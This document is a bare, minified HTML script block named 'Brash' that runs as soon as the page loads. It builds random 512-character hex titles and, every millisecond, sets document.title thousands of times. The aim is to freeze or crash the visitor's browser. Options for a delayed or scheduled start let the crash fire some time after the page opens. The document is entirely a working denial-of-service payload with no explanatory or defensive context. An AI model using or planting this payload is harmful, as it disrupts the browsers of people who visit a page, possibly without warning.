<script>const Brash={titles:[],counter:0,gid:function(){let e="";for(let t=0;t<512;t++)e+=(16*Math.random()|0).toString(16);return e},gen:function(){for(let e=0;e<100;e++)this.titles.push(this.gid())},inject:function(){const e=this.titles[Math.random()*this.titles.length|0];for(let t=0;t<3;t++)document.title=e+t;this.counter+=3},run:function(e){const t=e.burstSize||e.burst||8e3,n=e.interval||1,s=()=>{this.gen(),setInterval((()=>{for(let e=0;e<t;e++)this.inject()}),n)};if(e.delay){let t=1e4;if("number"==typeof e.delay)t=1e3*e.delay;else if("string"==typeof e.delay){const n=parseFloat(e.delay);e.delay.endsWith("ms")?t=n:e.delay.endsWith("s")?t=1e3*n:e.delay.endsWith("m")&&(t=6e4*n)}return setTimeout(s,t)}if(e.scheduled){const t=e.scheduled instanceof Date?e.scheduled.getTime():new Date(e.scheduled).getTime(),n=setInterval((()=>{Date.now()>=t&&(clearInterval(n),s())}),1e3)}else s()}};Brash.run({burstSize:8e3,interval:1});</script>
